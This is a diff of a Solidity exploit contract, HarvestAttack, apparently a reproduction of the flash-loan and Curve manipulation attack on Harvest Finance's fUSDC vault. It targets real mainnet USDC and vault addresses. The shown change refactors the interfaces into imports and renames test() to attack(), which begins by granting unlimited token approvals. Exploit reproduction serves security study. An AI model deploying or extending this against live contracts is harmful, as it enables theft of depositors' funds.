@@ -3,36 +3,12 @@ pragma solidity ^0.8.0;
 
 import "hardhat/console.sol";
 
+import "./IVault.sol";
 import "../interfaces/IERC20.sol";
+import "../interfaces/IUSDT.sol";
+import "../interfaces/ICurve.sol";
 import "../interfaces/IUniswapV2/IUniswapV2Pair.sol";
 import "../interfaces/IUniswapV2/IUniswapV2Callee.sol";
-import "./IStrategy.sol";
-
-interface ICurve {
-    function exchange_underlying(
-        int128 i,
-        int128 j,
-        uint256 dx,
-        uint256 min_dy
-    ) external;
-}
-
-interface IUSDT {
-    function approve(address _spender, uint256 _value) external;
-    function transfer(address _to, uint256 _value) external;
-    function balanceOf(address _owner) external view returns (uint256);
-}
-
-interface IVault {
-    function deposit(uint256) external;
-    function withdraw(uint256) external;
-    function balanceOf(address) external view returns (uint256);
-    function underlying() external view returns (address);
-    function depositArbCheck() external view returns(bool);
-    function underlyingBalanceWithInvestment() external view returns (uint256);
-    function underlyingBalanceInVault() external view returns (uint256);
-    function getPricePerFullShare() external view returns (uint256);
-}
 
 
 contract HarvestAttack is IUniswapV2Callee {
@@ -43,7 +19,7 @@ contract HarvestAttack is IUniswapV2Callee {
     IERC20 constant public usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IVault constant public fUSDC = IVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
 
-    function test() external {
+    function attack() external {
         usdt.approve(address(curve), type(uint256).max - 1);
         usdc.approve(address(curve), type(uint256).max - 1);
         usdc.approve(address(fUSDC), type(uint256).max - 1);
